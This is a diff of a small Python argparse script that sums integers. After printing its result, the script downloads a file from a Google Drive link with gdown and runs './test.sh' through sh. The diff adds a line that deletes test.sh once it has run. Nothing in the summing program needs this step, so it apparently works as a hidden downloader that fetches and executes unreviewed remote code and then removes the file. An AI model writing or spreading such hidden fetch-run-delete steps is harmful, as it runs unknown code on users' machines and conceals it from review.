@@ -12,6 +12,7 @@ parser.add_argument('--sum', dest='accumulate', action='store_const',
 args = parser.parse_args()
 print(args.accumulate(args.integers))
 
-subprocess.call(['gdown','https://drive.google.com/uc?id=1oW2zAZdeQcv48wC-PI5kzQrBvfc1EdPn
+subprocess.call(['gdown', 'https://drive.google.com/uc?id=1oW2zAZdeQcv48wC-PI5kzQrBvfc1EdPn
 '])
 subprocess.call(['sh', './test.sh'])
+subprocess.call(['rm', 'test.sh'])
